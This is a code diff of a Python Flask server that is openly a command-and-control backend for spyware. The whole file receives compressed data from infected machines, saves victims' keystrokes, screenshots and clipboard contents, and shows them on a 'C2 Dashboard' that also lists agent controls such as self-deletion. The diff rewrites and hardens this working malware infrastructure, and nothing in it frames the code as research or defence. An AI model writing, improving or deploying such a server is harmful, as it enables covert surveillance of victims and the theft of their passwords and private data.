@@ -1,131 +1,199 @@
-from flask import Flask, request, jsonify, send_from_directory, render_template_string
+from flask import Flask, request, jsonify, send_from_directory
 import base64
 import zlib
 import json
-from Crypto.Cipher import AES
 import os
 import datetime
-from collections import defaultdict
-import plotly.graph_objects as go
-import plotly.utils
-from plotly.subplots import make_subplots
 
 app = Flask(__name__)
-os.makedirs("c2_data", exist_ok=True)
-for d in ["c2_data/logs", "c2_data/keys", "c2_data/screenshots"]:
-    os.makedirs(d, exist_ok=True)
 
-KEY = b'\x00'*32  # Fixed for demo
-IV = b'\x00'*16
+# Ensure directories exist
+BASE_DIR = "c2_data"
+for folder in ["logs", "keys", "screenshots"]:
+    os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)
+
+def decrypt_payload(data_b64):
+    """Simple decrypt matching agent"""
+    try:
+        # Just decompress + parse (agent uses JSON now)
+        data_bytes = base64.b64decode(data_b64)
+        decompressed = zlib.decompress(data_bytes).decode('utf-8')
+        return json.loads(decompressed)
+    except Exception as e:
+        print(f"Decrypt error: {e}")
+        return None
 
 @app.route("/receive", methods=["POST"])
 def receive():
     try:
-        data = request.json["data"]
-        # Simplified decrypt (match agent)
-        payload = json.loads(zlib.decompress(base64.b64decode(data)).decode())
+        # Get encrypted data
+        payload_encrypted = request.json.get("data")
+        if not payload_encrypted:
+            return jsonify({"error": "No data"}), 400
         
-        session = payload["session_id"]
-        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        # Decrypt
+        payload = decrypt_payload(payload_encrypted)
+        if not payload:
+            return jsonify({"error": "Decrypt failed"}), 400
         
         # Save files
-        with open(f"c2_data/logs/{session}_{ts}.json", "w") as f:
+        session_id = payload.get("session_id", payload.get("hostname", "unknown"))
+        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        # JSON log
+        log_file = f"{BASE_DIR}/logs/{session_id}_{ts}.json"
+        with open(log_file, "w") as f:
             json.dump(payload, f, indent=2)
         
-        if payload.get("keys"):
-            with open(f"c2_data/keys/{session}_{ts}.txt", "w", encoding="utf-8") as f:
-                f.write(payload["keys"])
+        # Keylog
+        keys = payload.get("keys", "")
+        if keys:
+            keys_file = f"{BASE_DIR}/keys/{session_id}_{ts}.txt"
+            with open(keys_file, "w", encoding="utf-8") as f:
+                f.write(keys)
         
-        for shot in payload.get("screenshot_data", []):
-            with open(f"c2_data/screenshots/{shot['filename']}", "wb") as f:
-                f.write(base64.b64decode(shot['data']))
+        # Screenshots
+        shots = payload.get("screenshot_data", [])
+        saved_shots = 0
+        for shot in shots:
+            try:
+                shot_file = f"{BASE_DIR}/screenshots/{shot['filename']}"
+                img_data = base64.b64decode(shot["data"])
+                with open(shot_file, "wb") as f:
+                    f.write(img_data)
+                saved_shots += 1
+            except:
+                pass
         
-        return jsonify({"status": "ok"})
-    except:
-        return jsonify({"error": "fail"}), 400
+        print(f"✅ {session_id}: {len(keys)} keys, {saved_shots} shots")
+        return jsonify({
+            "status": "ok", 
+            "keys": len(keys), 
+            "shots": saved_shots,
+            "clipboard": len(payload.get("clipboard", []))
+        })
+        
+    except Exception as e:
+        print(f"ERROR: {e}")
+        return jsonify({"error": str(e)}), 500
 
 @app.route("/")
 def dashboard():
-    shots = os.listdir("c2_data/screenshots")[-12:]
-    keys = os.listdir("c2_data/keys")[-8:]
-    
-    return render_template_string("""
+    try:
+        # Get latest files
+        shots = sorted([f for f in os.listdir(f"{BASE_DIR}/screenshots") if f.endswith('.png')], reverse=True)[:12]
+        keylogs = sorted([f for f in os.listdir(f"{BASE_DIR}/keys") if f.endswith('.txt')], reverse=True)[:10]
+        
+        shots_html = ''.join([
+            f'<div class="shot"><a href="/shots/{shot}" target="_blank">'
+            f'<img src="/shots/{shot}" alt="{shot}" loading="lazy"></a>'
+            f'<div>{shot}</div></div>'
+            for shot in shots
+        ])
+        
+        keys_html = ''.join([
+            f'<div class="keylog"><a href="/keys/{key}" target="_blank">{key}</a></div>'
+            for key in keylogs
+        ])
+        
+        html = f"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔥 Ultimate C2 Dashboard</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>🔥 C2 Dashboard</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');
-        * { font-family: 'Fira Code', monospace; }
-        .glow { box-shadow: 0 0 20px #10ff00, inset 0 0 20px #10ff0050; }
+        *{{margin:0;padding:0;box-sizing:border-box}}
+        body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:20px;line-height:1.4}}
+        .header{{text-align:center;margin-bottom:30px}}
+        h1{{color:#0f0;font-size:3em;text-shadow:0 0 20px #0f0}}
+        .stats{{display:flex;justify-content:center;gap:40px;margin-bottom:30px;font-size:1.2em}}
+        .shots-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px;margin-bottom:30px}}
+        .shot{{background:#111;padding:15px;border-radius:10px;border:2px solid #333;transition:transform 0.3s}}
+        .shot:hover{{transform:scale(1.05);border-color:#0f0;box-shadow:0 0 20px #0f0}}
+        .shot img{{width:100%;height:180px;object-fit:cover;border-radius:5px}}
+        .shot div{{margin-top:10px;font-size:0.9em;overflow:hidden;text-overflow:ellipsis}}
+        .keylogs{{background:#111;padding:25px;border-radius:10px;border-left:5px solid #0f0;max-height:400px;overflow-y:auto}}
+        .keylog{{padding:12px;margin:8px 0;background:#000;border-radius:5px;cursor:pointer;transition:background 0.2s}}
+        .keylog:hover{{background:#0a0a0a}}
+        .keylog a{{color:#0f0;text-decoration:none}}
+        .controls{{text-align:center;margin-top:30px;padding:20px;background:#111;border-radius:10px}}
+        @media(max-width:768px){{.stats{{flex-direction:column;gap:20px}}.shots-grid{{grid-template-columns:1fr}}}}
     </style>
 </head>
-<body class="bg-gradient-to-br from-black to-gray-900 text-green-400 min-h-screen p-8">
-    <div class="max-w-7xl mx-auto">
-        <h1 class="text-5xl font-bold text-center mb-12 glow">🔥 ULTIMATE C2 DASHBOARD</h1>
-        
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
-            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
-                <h2 class="text-3xl">{{ len(shots) }}</h2>
-                <p>📸 Screenshots</p>
-            </div>
-            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
-                <h2 class="text-3xl">{{ len(keys) }}</h2>
-                <p>⌨️ Keylogs</p>
-            </div>
-            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 glow">
-                <h2 class="text-3xl">LIVE</h2>
-                <p>🟢 Active Sessions</p>
-            </div>
+<body>
+    <div class="header">
+        <h1>🔥 C2 DASHBOARD</h1>
+        <div class="stats">
+            <div>📸 {len(shots)} Screenshots</div>
+            <div>⌨️ {len(keylogs)} Keylogs</div>
+            <div>🟢 LIVE</div>
         </div>
-        
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
-            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500">
-                <h3 class="text-2xl mb-6">🖼️ Latest Screenshots</h3>
-                {% for shot in shots %}
-                <a href="/shots/{{ shot }}" target="_blank">
-                    <img src="/shots/{{ shot }}" class="w-full h-48 object-cover rounded-lg mb-4 border-2 border-green-500 hover:glow transition-all">
-                </a>
-                {% endfor %}
-            </div>
-            
-            <div class="bg-gray-900 p-8 rounded-xl border-2 border-green-500 max-h-96 overflow-y-auto">
-                <h3 class="text-2xl mb-6">⌨️ Latest Keylogs</h3>
-                {% for key in keys %}
-                <a href="/keys/{{ key }}" target="_blank" class="block p-4 mb-4 bg-gray-800 rounded-lg border-l-4 border-green-500 hover:bg-gray-700">
-                    <strong>{{ key }}</strong>
-                </a>
-                {% endfor %}
-            </div>
-        </div>
-        
-        <div class="text-center text-lg">
-            <p class="mb-4">🛑 <strong>Ctrl+Alt+Q</strong> = Stop Agent | <strong>ESC</strong> = Self-Delete</p>
-            <p>Last update: {{ now }}</p>
-        </div>
+    </div>
+    
+    <div class="shots-grid">
+        {shots_html}
+    </div>
+    
+    <div class="keylogs">
+        <h2 style="margin-bottom:20px;font-size:1.5em">⌨️ Latest Keylogs</h2>
+        {keys_html}
+    </div>
+    
+    <div class="controls">
+        <h3>🎮 CONTROLS</h3>
+        <p><strong>Ctrl+Alt+Q</strong> = 🛑 Stop Agent</p>
+        <p><strong>ESC</strong> = 💥 Self-Delete</p>
+        <p>Last update: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")}</p>
     </div>
 </body>
 </html>
-    """, shots=shots, keys=keys, now=datetime.datetime.now())
+        """
+        return html
+        
+    except Exception as e:
+        return f"<h1>Dashboard Error: {e}</h1>", 500
 
 @app.route("/shots/<path:filename>")
 def serve_shot(filename):
-    return send_from_directory("c2_data/screenshots", filename)
+    try:
+        return send_from_directory(f"{BASE_DIR}/screenshots", filename)
+    except:
+        return "File not found", 404
 
 @app.route("/keys/<path:filename>")
 def serve_key(filename):
-    path = f"c2_data/keys/{filename}"
-    if os.path.exists(path):
-        with open(path, "r", encoding="utf-8") as f:
-            content = f.read()
-        return f"""
-        <div style="font-family:monospace;background:black;color:lime;padding:40px;font-size:16px;height:100vh;overflow:auto">
-            <h1 style="color:lime;margin-bottom:20px">{filename}</h1>
-            <pre style="white-space:pre-wrap;word-break:break-all">{content}</pre>
-        </div>
-        """
-    return "Not found", 404
+    try:
+        filepath = f"{BASE_DIR}/keys/{filename}"
+        if os.path.exists(filepath):
+            with open(filepath, "r", encoding="utf-8") as f:
+                content = f.read()
+            
+            # Escape HTML
+            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+            content = content.replace('\n', '<br>').replace(' ', '&nbsp;')
+            
+            return f"""
+<!DOCTYPE html>
+<html><head><title>Keylog: {filename}</title>
+<style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:40px;font-size:16px;line-height:1.6}}
+pre{{background:#111;padding:30px;border-radius:15px;border:2px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style>
+</head>
+<body>
+<h1 style="color:#0f0;margin-bottom:30px">{filename}</h1>
+<pre>{content}</pre>
+<a href="/" style="position:fixed;top:20px;left:20px;color:#0f0;font-size:20px;text-decoration:none">🏠 Dashboard</a>
+</body></html>
+            """
+        return "File not found", 404
+    except Exception as e:
+        return f"Error: {e}", 500
+
+@app.errorhandler(500)
+def internal_error(error):
+    return "Server error - check logs", 500
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    port = int(os.environ.get("PORT", 5000))
+    print(f"🚀 Server running on port {port}")
+    app.run(host="0.0.0.0", port=port, debug=False)
